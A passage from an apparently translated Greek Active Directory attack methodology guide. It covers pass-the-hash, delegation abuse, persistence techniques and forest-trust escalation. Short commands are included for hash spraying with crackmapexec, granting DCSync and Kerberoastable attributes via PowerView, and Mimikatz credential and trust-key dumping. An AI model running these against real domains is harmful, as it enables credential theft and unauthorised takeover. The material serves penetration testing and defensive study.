Πρέπει να χρησιμοποιήσετε κάποιο εργαλείο που θα εκτελέσει την NTLM authentication χρησιμοποιώντας εκείνο το hash, ή μπορείτε να δημιουργήσετε ένα νέο sessionlogon και να εισάγετε εκείνο το hash μέσα στο LSASS, έτσι ώστε όταν πραγματοποιείται οποιαδήποτε NTLM authentication, να χρησιμοποιηθεί εκείνο το hash. Η τελευταία επιλογή είναι αυτή που κάνει το mimikatz.  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει στο να χρησιμοποιήσει το NTLM hash ενός χρήστη για να αιτηθεί Kerberos tickets, ως εναλλακτική στην κοινή τεχνική Pass The Hash πάνω από το NTLM πρωτόκολλο. Επομένως, αυτό μπορεί να είναι ιδιαίτερα χρήσιμο σε δίκτυα όπου το NTLM πρωτόκολλο είναι απενεργοποιημένο και επιτρέπεται μόνο το Kerberos ως authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στην μέθοδο επίθεσης Pass The Ticket (PTT), οι επιτιθέμενοι κλέβουν το authentication ticket ενός χρήστη αντί για τον κωδικό ή τις hash τιμές του. Το κλεμμένο ticket χρησιμοποιείται έπειτα για να παριστάνουν τον χρήστη, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες μέσα σε ένα δίκτυο.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Αν έχετε το hash ή τον password ενός local administrator, θα πρέπει να προσπαθήσετε να συνδεθείτε τοπικά σε άλλους PCs με αυτό.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **θορυβώδες** και το **LAPS** θα **το μετριάσει**.

### MSSQL Abuse & Trusted Links

Εάν ένας χρήστης έχει προνόμια για **access MSSQL instances**, θα μπορούσε να τα χρησιμοποιήσει για να **execute commands** στον MSSQL host (αν τρέχει ως SA), να **steal** το NetNTLM **hash** ή ακόμη και να πραγματοποιήσει μια **relay** **attack**.\
Επιπλέον, αν ένα MSSQL instance είναι trusted (database link) από ένα διαφορετικό MSSQL instance, και ο χρήστης έχει προνόμια πάνω στη trusted database, θα μπορεί να **use the trust relationship to execute queries also in the other instance**. Αυτές οι εμπιστοσύνες μπορούν να αλυσοδεθούν και κάποια στιγμή ο χρήστης μπορεί να βρει μια λάθος διαμορφωμένη βάση δεδομένων όπου θα μπορεί να εκτελέσει εντολές.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory και deployment suites συχνά αποκαλύπτουν ισχυρές οδούς προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρείτε οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain προνόμια στον υπολογιστή, θα μπορείτε να κάνετε dump TGTs από τη μνήμη κάθε χρήστη που κάνει login στον υπολογιστή.\
Έτσι, αν ένας **Domain Admin logins onto the computer**, θα μπορείτε να κάνετε dump το TGT του και να τον μιμηθείτε χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στην constrained delegation θα μπορούσατε ακόμη και να **αυτόματα compromise έναν Print Server** (ελπίζοντας ότι θα είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής έχει επιτρεπτό για "Constrained Delegation", θα μπορεί να **impersonate any user to access some services in a computer**.\
Τότε, αν **compromise the hash** αυτού του user/computer θα μπορείτε να **impersonate any user** (ακόμη και domain admins) για να αποκτήσετε πρόσβαση σε κάποιες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Το να έχετε **WRITE** δικαίωμα σε ένα Active Directory αντικείμενο ενός απομακρυσμένου υπολογιστή επιτρέπει την επίτευξη code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ο συμβιβασμένος χρήστης μπορεί να έχει κάποια **interesting privileges over some domain objects** που θα μπορούσαν να σας επιτρέψουν να **move** lateral/**escalate** privileges αργότερα.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Η ανεύρεση μιας **Spool service listening** εντός του domain μπορεί να **abused** για να **acquire new credentials** και να **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Αν **άλλοι χρήστες** **access** τη **compromised** μηχανή, είναι πιθανό να **gather credentials from memory** και ακόμη **inject beacons in their processes** για να τους μιμηθείτε.\
Συνήθως οι χρήστες θα συνδέονται μέσω RDP, οπότε εδώ έχετε πώς να πραγματοποιήσετε μερικές επιθέσεις πάνω σε third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined computers, εξασφαλίζοντας ότι είναι **randomized**, μοναδικό, και συχνά **changed**. Αυτά τα passwords αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο σε εξουσιοδοτημένους χρήστες. Με επαρκή permissions για πρόσβαση σε αυτά τα passwords, η pivoting σε άλλους υπολογιστές γίνεται δυνατή.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Το **gathering certificates** από τη compromised μηχανή θα μπορούσε να είναι ένας τρόπος για escalation privileges μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Αν υπάρχουν **vulnerable templates** ρυθμισμένα, είναι δυνατόν να τα abuse για escalation privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Μόλις αποκτήσετε **Domain Admin** ή ακόμα καλύτερα **Enterprise Admin** προνόμια, μπορείτε να **dump** τη **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Κάποιες από τις τεχνικές που συζητήθηκαν παραπάνω μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα μπορείτε να:

- Κάνετε χρήστες ευάλωτους στο [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Κάνετε χρήστες ευάλωτους στο [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Δώσετε [**DCSync**](#dcsync) προνόμια σε έναν χρήστη

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Η **Silver Ticket attack** δημιουργεί ένα **legitimate Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία χρησιμοποιώντας το **NTLM hash** (π.χ. το **hash of the PC account**). Αυτή η μέθοδος χρησιμοποιείται για να **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Μια **Golden Ticket attack** περιλαμβάνει την απόκτηση του **NTLM hash του krbtgt account** σε ένα Active Directory περιβάλλον. Αυτός ο λογαριασμός είναι ιδιαίτερος γιατί χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, που είναι ουσιώδη για την authentication μέσα στο AD δίκτυο.

Μόλις ο επιτιθέμενος αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιθυμεί (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά είναι σαν golden tickets που κατασκευάζονται με τρόπο που **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Το **να έχετε certificates ενός account ή να μπορείτε να τα request** είναι ένας πολύ καλός τρόπος να παραμείνετε στο account του χρήστη (ακόμη και αν αλλάξει το password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Χρησιμοποιώντας certificates είναι επίσης δυνατό να παραμείνετε με high privileges μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως Domain Admins και Enterprise Admins) εφαρμόζοντας ένα πρότυπο **Access Control List (ACL)** σε αυτές τις ομάδες για να αποτρέψει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να αξιοποιηθεί· αν ένας επιτιθέμενος τροποποιήσει το ACL του AdminSDHolder για να δώσει πλήρη πρόσβαση σε έναν απλό χρήστη, αυτός ο χρήστης αποκτά εκτεταμένο έλεγχο πάνω σε όλες τις privileged groups. Αυτό το security μέτρο, που στοχεύει στην προστασία, μπορεί επομένως να γυρίσει πίσω και να επιτρέψει ανεπιθύμητη πρόσβαση εκτός αν παρακολουθείται στενά.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Σε κάθε **Domain Controller (DC)** υπάρχει ένας **local administrator** λογαριασμός. Με το να αποκτήσετε admin rights σε μια τέτοια μηχανή, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας **mimikatz**. Έπειτα απαιτείται μια τροποποίηση στο registry για να **enable the use of this password**, επιτρέποντας την απομακρυσμένη πρόσβαση στον local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Μπορείτε να **δώσετε** μερικά **ειδικά permissions** σε έναν **user** πάνω σε συγκεκριμένα domain objects που θα επιτρέψουν στον χρήστη να **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Οι **security descriptors** χρησιμοποιούνται για να **αποθηκεύουν** τα **permissions** που έχει ένα **object** πάνω σε ένα άλλο **object**. Αν μπορείτε απλώς να **κάνετε** μια **μικρή αλλαγή** στον **security descriptor** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα privileges πάνω σε αυτό το αντικείμενο χωρίς να χρειάζεται να είστε μέλος μιας privileged ομάδας.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Τροποποιήστε το **LSASS** στη μνήμη για να εγκαταστήσετε ένα **universal password**, παρέχοντας πρόσβαση σε όλους τους domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **capture** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στη μηχανή.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρεί έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα **χωρίς** να αφήνει logs όσον αφορά τις **τροποποιήσεις**. Χρειάζεστε DA προνόμια και να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λάθος δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να αναβαθμίσετε δικαιώματα αν έχετε **αρκετή άδεια να διαβάσετε LAPS passwords**. Ωστόσο, αυτά τα passwords μπορούν επίσης να χρησιμοποιηθούν για να **διατηρήσετε persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το security boundary. Αυτό υπονοεί ότι **ο συμβιβασμός ενός μεμονωμένου domain θα μπορούσε δυνητικά να οδηγήσει στον συμβιβασμό ολόκληρου του Forest**.

### Basic Information

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφάλειας που επιτρέπει σε έναν χρήστη από ένα **domain** να έχει πρόσβαση σε πόρους σε άλλο **domain**. Ουσιαστικά δημιουργεί μια σύνδεση μεταξύ των authentication συστημάτων των δύο domains, επιτρέποντας στην επικύρωση authentication να ρέει αβίαστα. Όταν τα domains δημιουργούν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** μέσα στους **Domain Controllers (DCs)** τους, που είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, αν ένας χρήστης θέλει να προσπελάσει μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket γνωστό ως **inter-realm TGT** από τον δικό του domain's DC. Αυτό το TGT κρυπτογραφείται με ένα κοινό **key** που έχουν συμφωνήσει και τα δύο domains. Ο χρήστης παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Μετά την επιτυχή επαλήθευση του inter-realm TGT από τον DC του trusted domain, αυτός εκδίδει ένα TGS, παρέχοντας στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)** του.
2. Ο DC1 εκδίδει ένα νέο TGT αν ο client έχει πιστοποιηθεί με επιτυχία.
3. Ο client στη συνέχεια ζητάει ένα **inter-realm TGT** από τον DC1, το οποίο χρειάζεται για πρόσβαση σε πόρους στο **Domain 2**.
4. Το inter-realm TGT κρυπτογραφείται με ένα **trust key** που μοιράζονται ο DC1 και ο DC2 ως μέρος του two-way domain trust.
5. Ο client παίρνει το inter-realm TGT στον **Domain Controller (DC2)** του Domain 2.
6. Ο DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το κοινό trust key και, αν είναι έγκυρο, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 που ο client θέλει να έχει πρόσβαση.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, που είναι κρυπτογραφημένο με το hash του account του server, για να αποκτήσει πρόσβαση στην υπηρεσία στο Domain 2.

### Different trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι 1-way ή 2-way**. Στη 2-way επιλογή, και τα δύο domains θα εμπιστεύονται το ένα το άλλο, αλλά στη **1-way** σχέση το ένα από τα domains θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να έχετε πρόσβαση μόνο στους πόρους εντός του trusting domain από το trusted domain**.

Αν το Domain A trusts το Domain B, το A είναι το trusting domain και το B είναι το trusted. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**· και στο **Domain B**, αυτό θα είναι ένα **Inbound trust**.

**Διάφορες σχέσεις εμπιστοσύνης**

- **Parent-Child Trusts**: Αυτό είναι ένα συνηθισμένο setup εντός του ίδιου forest, όπου ένα child domain έχει αυτόματα δύο-κατευθύνσεων transitive trust με το parent domain. Ουσιαστικά αυτό σημαίνει ότι τα authentication requests μπορούν να ρέουν αβίαστα μεταξύ parent και child.
- **Cross-link Trusts**: Αναφέρονται ως "shortcut trusts", αυτά δημιουργούνται μεταξύ child domains για να επιταχύνουν τις referrals διαδικασίες. Σε πολύπλοκα forests, οι authentication referrals συνήθως πρέπει να ταξιδέψουν μέχρι τη ρίζα του forest και μετά κάτω στο target domain. Δημιουργώντας cross-links, η διαδρομή μειώνεται, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά διασπαρμένα περιβάλλοντα.
- **External Trusts**: Αυτά δημιουργούνται μεταξύ διαφορετικών, μη σχετιζόμενων domains και είναι από τη φύση τους non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για πρόσβαση σε πόρους σε ένα domain έξω από το τρέχον forest που δεν συνδέεται με forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός πρόσφατα προστιθέμενου tree root. Αν και δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και εξασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες στο [Microsoft guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα two-way transitive trust μεταξύ δύο forest root domains, επιβάλλοντας επίσης SID filtering για την ενίσχυση των μέτρων ασφάλειας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι πιο εξειδικευμένα και απευθύνονται σε περιβάλλοντα που απαιτούν ενσωμάτωση με Kerberos-based συστήματα εκτός του Windows οικοσυστήματος.

#### Άλλες διαφορές στις **σχέσεις εμπιστοσύνης**

- Μια σχέση trust μπορεί επίσης να είναι **transitive** (A trusts B, B trusts C, τότε A trusts C) ή **non-transitive**.
- Μια σχέση trust μπορεί να ρυθμιστεί ως **bidirectional trust** (και τα δύο εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Attack Path

1. **Enumerate** τις σχέσεις trusting
2. Ελέγξτε αν οποιοσδήποτε **security principal** (user/group/computer) έχει **access** σε πόρους του **άλλου domain**, ίσως μέσω ACE entries ή επειδή είναι σε groups του άλλου domain. Αναζητήστε **relationships across domains** (πιθανώς το trust δημιουργήθηκε γι' αυτό).
1. kerberoast σε αυτή την περίπτωση θα μπορούσε να είναι άλλη επιλογή.
3. **Compromise** τους **accounts** που μπορούν να **pivot** μέσω domains.

Οι επιτιθέμενοι μπορούν να αποκτήσουν πρόσβαση σε πόρους σε άλλο domain μέσω τριών κύριων μηχανισμών:

- **Local Group Membership**: Principals μπορεί να προστεθούν σε local groups σε μηχανές, όπως η “Administrators” group σε έναν server, παρέχοντάς τους σημαντικό έλεγχο πάνω σε αυτή τη μηχανή.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι μέλη groups μέσα στο ξένο domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το scope του group.
- **Access Control Lists (ACLs)**: Principals μπορεί να αναφέρονται σε ένα **ACL**, ειδικά ως entities σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένους πόρους. Για όσους θέλουν να εμβαθύνουν στον μηχανισμό των ACLs, DACLs και ACEs, το whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” είναι ανεκτίμητο.

### Find external users/groups with permissions

Μπορείτε να ελέγξετε **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρείτε foreign security principals στο domain. Αυτοί θα είναι χρήστες/ομάδες από **ένα εξωτερικό domain/forest**.

Μπορείτε να το ελέγξετε αυτό στο **Bloodhound** ή χρησιμοποιώντας powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για να enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, ένα για _Child --> Parent_ και ένα άλλο για _Parent_ --> _Child_.\
> Μπορείτε να βρείτε αυτό που χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Αναβαθμίστε σε Enterprise admin στο child/parent domain εκμεταλλευόμενοι τη trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Η κατανόηση του πώς μπορεί να εκμεταλλευτεί το Configuration Naming Context (NC) είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο για δεδομένα ρύθμισης σε όλο το forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) στο forest, με writable DCs να διατηρούν ένα εγγράψιμο αντίγραφο του Configuration NC. Για να το εκμεταλλευτεί κανείς, πρέπει να έχει **SYSTEM privileges on a DC**, κατά προτίμηση σε child DC.

**Link GPO to root DC site**

Το Sites container του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των domain-joined υπολογιστών εντός του AD forest. Λειτουργώντας με SYSTEM privileges σε οποιονδήποτε DC, οι επιτιθέμενοι μπορούν να συνδέσουν GPOs στα root DC sites. Αυτή η ενέργεια ενδέχεται να υπονομεύσει το root domain με την παραποίηση των policies που εφαρμόζονται σε αυτά τα sites.

Για εις βάθος πληροφορίες, μπορείτε να δείτε την έρευνα [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Ένας επιθέσιμος φορέας περιλαμβάνει τη στοχευμένη επίθεση σε privileged gMSAs εντός του domain. Το KDS Root key, απαραίτητο για τον υπολογισμό των passwords των gMSA, είναι αποθηκευμένο μέσα στο Configuration NC. Με SYSTEM privileges σε οποιονδήποτε DC, είναι εφικτό να αποκτήσει κανείς πρόσβαση στο KDS Root key και να υπολογίσει τα passwords για οποιοδήποτε gMSA σε όλο το forest.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, αναμονή για τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας επιτιθέμενος μπορεί να τροποποιήσει το AD Schema ώστε να παραχωρήσει σε οποιονδήποτε χρήστη πλήρη έλεγχο πάνω σε όλες τις κλάσεις. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο των νεοδημιουργημένων AD objects.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει τον έλεγχο πάνω σε Public Key Infrastructure (PKI) objects για να δημιουργήσει ένα certificate template που επιτρέπει authentication ως οποιοσδήποτε χρήστης εντός του forest. Καθώς τα PKI objects βρίσκονται στο Configuration NC, ο συμβιβασμός ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Σε περιπτώσεις όπου λείπει το ADCS, ο επιτιθέμενος έχει τη δυνατότητα να εγκαταστήσει τα απαραίτητα components, όπως συζητείται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο, ένα εξωτερικό domain **εμπιστεύεται το domain σας**, δίνοντάς σας **απροσδιόριστες άδειες** πάνω του. Θα χρειαστεί να βρείτε **ποιοι principals του domain σας έχουν ποια πρόσβαση στο εξωτερικό domain** και στη συνέχεια να προσπαθήσετε να το εκμεταλλευτείτε:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικό Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο το **domain σας** εμπιστεύεται κάποια **privileges** σε έναν **principal** από **διαφορετικό domain**.

Ωστόσο, όταν ένα **domain is trusted** από το trusting domain, το trusted domain **creates a user** με ένα **predictable name** που χρησιμοποιεί ως **password the trusted password**. Αυτό σημαίνει ότι είναι δυνατόν να **access a user from the trusting domain to get inside the trusted one** για να το καταγράψει κανείς και να προσπαθήσει να αυξήσει περαιτέρω τα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος για να συμβιβαστεί το trusted domain είναι να βρεθεί ένας [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί στην **opposite direction** της domain trust (κάτι που δεν είναι πολύ συνηθισμένο).

Ένας ακόμη τρόπος για να συμβιβαστεί το trusted domain είναι να περιμένει κάποιος σε μια μηχανή όπου ένας **user from the trusted domain can access** για να συνδεθεί μέσω **RDP**. Στη συνέχεια, ο attacker μπορεί να εγχύσει κώδικα στη διεργασία της RDP session και να **access the origin domain of the victim** από εκεί.\
Επιπλέον, αν το **victim mounted his hard drive**, από τη διεργασία της **RDP session** ο attacker θα μπορούσε να αποθηκεύσει **backdoors** στο **startup folder of the hard drive**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που αξιοποιούν το SID history attribute διαμέσου forest trusts μετριάζεται από το SID Filtering, το οποίο είναι ενεργοποιημένο από προεπιλογή σε όλες τις inter-forest trusts. Αυτό βασίζεται στην υπόθεση ότι οι intra-forest trusts είναι ασφαλείς, θεωρώντας το forest, αντί για το domain, ως το όριο ασφαλείας σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει ένα πρόβλημα: το SID filtering μπορεί να διαταράξει εφαρμογές και την πρόσβαση χρηστών, οδηγώντας μερικές φορές στην απενεργοποίησή του.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι χρήστες από τα δύο forests δεν πιστοποιούνται αυτόματα. Αντίθετα, απαιτούνται ρητές άδειες για να έχουν οι χρήστες πρόσβαση σε domains και servers εντός του trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Η [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί τα bloodyAD-style LDAP primitives ως x64 Beacon Object Files που τρέχουν εξολοκλήρου μέσα σε ένα on-host implant (π.χ. Adaptix C2). Οι χειριστές μεταγλωττίζουν το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν `ldap.axs`, και μετά καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context πάνω από LDAP (389) με signing/sealing ή LDAPS (636) με auto certificate trust, οπότε δεν απαιτούνται socks proxies ή artifacts στο δίσκο.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` επιλύουν συντομευμένα ονόματα / διαδρομές OU σε πλήρη DNs και εξάγουν τα αντίστοιχα αντικείμενα.
- `get-object`, `get-attribute`, and `get-domaininfo` τραβούν αυθαίρετα attributes (συμπεριλαμβανομένων security descriptors) καθώς και τα forest/domain metadata από το `rootDSE`.
